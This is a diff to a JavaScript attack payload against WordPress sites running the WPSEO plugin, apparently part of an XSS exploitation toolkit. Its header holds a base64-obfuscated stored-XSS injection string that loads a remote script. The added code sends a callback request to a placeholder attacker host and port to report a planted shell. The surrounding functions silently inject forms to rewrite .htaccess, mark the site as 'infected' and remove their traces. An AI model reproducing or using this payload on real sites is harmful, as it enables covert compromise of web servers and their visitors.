@@ -1,15 +1,21 @@
 // WordPress WPSEO Payload
 // Author: Hans-Michael Varbaek
 // Company: Sense of Security
-// Version: 2.1
+// 
+// Version 2.5 - 2016
+// 
+// Changelog:
+// - Ver 2.5: Added XMLHttpRequest for JS Notification
+//
 // Credits: InterN0T
 //
 // Requirements: 
 // 1) Ability to edit "robots.txt" and ".htaccess" within WPSEO. (Default feature)
 // 2) That Apache is not configured with "AllowOverride None" for the document root.
 //
-// Tested Browser:
-// Chrome (latest version - 14 Nov 2015)
+// Tested Browsers:
+// - Chrome (14 Nov 2015) - This should still work.
+// - FireFox (04 Nov 2016)
 //
 // Better WP Security - Stored XSS (Old Exploit - See Exploit-DB)
 // Sample Injection Payload: "><script>document.write(atob(/PHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LjkyLjE0OC94c3MuanMiPjwvc2NyaXB0Pg==/.source))</script>
@@ -74,8 +80,14 @@ function silent_htaccess_inject() {
    top.document.getElementById('silent_htaccess_frame').contentDocument.getElementById('htaccess_haxx').submit();
    SetCookie("Htaccess_Infected","true"); // Prevent re-infection / loops
 
-   // Give our script five seconds to execute and inject the prepopulated forms before self-removal
-   var end = setTimeout("clean_up()",5000); 
+   // NEW FEATURE
+   var request = new XMLHttpRequest(); // Initiate XMLHttpRequest
+   request.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt"); // Method and URL to send the request to - Hostname and port are set by xsser.py
+   request.send(); // Send the request
+
+   // Give our script two seconds to execute and inject the prepopulated forms before self-removal.
+   // Timeout changed from 5 seconds to 2 seconds - Version 2.5
+   var end = setTimeout("clean_up()",2000); 
 
    }
 }
@@ -107,7 +119,7 @@ function silent_form_inject(action,method,content,framename,identifier) {
    silent_main_tag.innerHTML = ' '+content;
    top.document.getElementById(framename).contentDocument.body.appendChild(silent_main_tag);
    silent_main_tag.setAttribute('id',identifier);
-   silent_main_tag.setAttribute('name','hitbams2014');
+   silent_main_tag.setAttribute('name','blackhat2016'); // Changed name version 2.5
    silent_main_tag.setAttribute('action',action);
    silent_main_tag.setAttribute('method',method);
 }
